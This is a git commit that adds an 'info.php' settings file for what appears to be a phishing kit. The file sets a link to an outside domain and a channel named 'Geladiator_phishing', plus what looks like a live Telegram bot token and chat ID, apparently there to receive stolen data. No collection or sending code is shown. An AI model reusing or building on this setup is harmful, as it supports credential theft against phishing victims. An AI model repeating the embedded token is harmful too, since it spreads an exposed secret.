c6dd36695cb0144fe327f29e9ead861fb19022d7
TRSONGIR <67713900+TRSONGIR@users.noreply.github.com>
2020-09-14 15:29:21 +0430

    A

---
+++ info.php
@@ -0,0 +1,15 @@
+<?php
+
+ 
+$link= "http://iran-wenos.ml/";
+
+$chanel= "Geladiator_phishing";
+
+$name = "Geladiator" ;
+
+
+$TOKENM = "1237690521:AAFVWN_LSL6J44g9xpEpzE2VEjTtLZ7V9cE";
+
+$IDM = -389276288;
+
+?>
